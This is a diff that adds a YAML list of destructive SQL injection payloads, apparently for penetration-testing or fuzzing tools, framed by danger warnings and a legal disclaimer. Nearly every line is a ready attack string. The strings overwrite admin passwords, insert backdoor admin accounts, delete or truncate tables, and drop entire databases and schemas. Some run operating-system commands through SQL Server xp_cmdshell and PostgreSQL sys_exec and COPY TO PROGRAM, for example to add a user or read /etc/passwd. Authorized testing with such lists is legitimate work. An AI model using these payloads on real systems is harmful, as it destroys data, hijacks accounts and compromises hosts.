@@ -1,0 +1,45 @@
+# ⚠️ DANGEROUS DATABASE MANIPULATION PAYLOADS ⚠️
+# ------------------------------------------------
+# WARNING: These payloads can cause PERMANENT DAMAGE to databases
+# USE WITH EXTREME CAUTION and ONLY on systems you have permission to modify
+# These payloads may be ILLEGAL to use without authorization
+
+payloads:
+  # ⚠️ Password modification payloads
+  - "'; UPDATE users SET password='hacked' WHERE username='admin'; --"
+  - "'; UPDATE users SET password='password123' WHERE 1=1; --"
+  - "'; UPDATE user_accounts SET passwd='compromised' WHERE user='admin'; --"
+  
+  # ⚠️ New user creation payloads
+  - "'; INSERT INTO users (username, password, role) VALUES ('hacker', 'password', 'admin'); --"
+  - "'; INSERT INTO accounts (user, pass, privileges) VALUES ('backdoor', 'backdoor', 'dba'); --"
+  
+  # ⚠️ Data deletion payloads (HIGHLY DESTRUCTIVE)
+  - "'; DELETE FROM users WHERE username<>'admin'; --"
+  - "'; DELETE FROM customers; --"
+  - "'; TRUNCATE TABLE orders; --"
+  
+  # ⚠️⚠️⚠️ DATABASE DESTRUCTION PAYLOADS (EXTREMELY DANGEROUS)
+  # These will likely destroy the database completely
+  - "'; DROP TABLE users; --"
+  - "'; DROP TABLE customers; --"
+  - "'; DROP DATABASE website; --"
+  - "'; DROP SCHEMA public; --"  # PostgreSQL
+  
+  # 🔥 Complete data destruction payloads
+  # ILLEGAL in most circumstances without written permission
+  - "'; DROP DATABASE IF EXISTS mysql; --"  # MySQL
+  - "'; DROP ALL TABLES; --"  # H2 Database
+  - "'; DROP SCHEMA public CASCADE; --"  # PostgreSQL
+  
+  # ⛔ System level commands (OS command injection via SQL)
+  # These attempt to execute system commands
+  - "'; EXEC xp_cmdshell 'net user hacker hacker /add'; --"  # SQL Server
+  - "'; EXEC master..xp_cmdshell 'echo vulnerable > C:\\vulnerability.txt'; --"  # SQL Server
+  - "'; SELECT sys_exec('cat /etc/passwd'); --"  # PostgreSQL with extension
+  - "'; COPY (SELECT '') TO PROGRAM 'touch /tmp/pwned'; --"  # PostgreSQL
+
+# ⚠️ LEGAL DISCLAIMER ⚠️
+# Using these payloads without explicit permission is likely illegal.
+# These are provided ONLY for educational purposes and legitimate penetration testing.
+# You are responsible for how you use these payloads and any resulting consequences. 
